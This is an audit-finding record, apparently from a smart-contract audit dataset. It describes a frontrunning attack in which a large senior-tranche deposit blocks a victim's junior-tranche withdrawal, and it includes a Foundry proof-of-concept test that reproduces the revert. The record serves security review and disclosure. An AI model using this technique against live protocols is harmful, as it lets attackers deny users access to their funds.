# [H] Frontrunning to Block Junior Tranche Withdrawals

## Summary
Severity: High
Contest weight: 0.0000
Dataset id: 23385
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
Description: In Accounting.sol, the junior tranche's maxWithdraw is capped to ensure the post-withdrawal Junior NAV (jrtNav) remains at least srtNav * minimumJrtSrtRatio / 1e18 (default 5%). This check uses the current (post-any-updates) NAVs from storage and is called during withdrawals in Tranche.sol (via withdraw function).  
An attacker can frontrun a victim's junior withdrawal transaction in the mempool:  
• The attacker deposits a calculated amount into the senior tranche (SRT), inflating srtNav via updateBalanceFlow (called internally during deposit).  
• This raises the minJrt threshold, causing the victim's withdrawal to fail the maxWithdraw check and revert.  
It is not necessary to deposit max amount just need to deposit enough to make this condition revert  

```solidity
uint256 maxAssets = maxWithdraw(owner);
if (baseAssets > maxAssets) {
    revert ERC4626ExceededMaxWithdraw(owner, baseAssets, maxAssets);
}
```

## Proof of Concept
The following Foundry test (test_FrontrunJRTWithdrawal from test/CDO.t.sol)

```solidity
function test_FrontrunJRTWithdrawal() public {
    // Setup initial state: Mint and deposit to JRT and SRT
    address victim = address(0x1234);
    address attacker = address(0x5678);
    address initialDepositor = address(0x9999);
    uint256 initialJRTDeposit = 100 ether; // jrtNav 100 ether
    uint256 initialSRTDeposit = 1000 ether; // srtNav 1000 ether
    uint256 victimWithdrawalAmount = 40 ether; // Should be valid pre-attack
    uint256 attackDepositAmount = 1000 ether; // Enough to push JRT maxWithdraw to 0
    // Victim deposits to JRT
    vm.startPrank(victim);
    USDe.mint(victim, initialJRTDeposit);
    USDe.approve(address(jrtVault), initialJRTDeposit);
    jrtVault.deposit(initialJRTDeposit, victim);
    vm.stopPrank();
    // Initial depositor to SRT (could be anyone)
    vm.startPrank(initialDepositor);
    USDe.mint(initialDepositor, initialSRTDeposit);
    USDe.approve(address(srtVault), initialSRTDeposit);
    srtVault.deposit(initialSRTDeposit, initialDepositor);
    vm.stopPrank();
    // Verify initial state: JRT maxWithdraw should allow the withdrawal
    uint256 preMaxWithdraw = accounting.maxWithdraw(true); // isJrt=true
    assertGt(preMaxWithdraw, victimWithdrawalAmount, "Initial maxWithdraw too low");
    // Simulate attacker frontrunning with large SRT deposit
    vm.startPrank(attacker);
    USDe.mint(attacker, attackDepositAmount);
    USDe.approve(address(srtVault), attackDepositAmount);
    srtVault.deposit(attackDepositAmount, attacker);
    vm.stopPrank();
    // Now simulate victim's withdrawal attempt (should fail due to updated cap)
    vm.startPrank(victim);
    vm.expectRevert(
        abi.encodeWithSelector(
            ERC4626ExceededMaxWithdraw.selector,
            victim,
            victimWithdrawalAmount,
            0 // Post-attack maxWithdraw should be 0
        )
    );
    jrtVault.withdraw(victimWithdrawalAmount, victim, victim);
    vm.stopPrank();
    // Verify post-attack state
    uint256 postMaxWithdraw = accounting.maxWithdraw(true);
    assertEq(postMaxWithdraw, 0, "Post-attack maxWithdraw not zeroed");
}
```

Steps to Reproduce:  
1. Run the test in Foundry: `forge test --match-test test_FrontrunJRTWithdrawal`.

## Recommendation
Information not provided
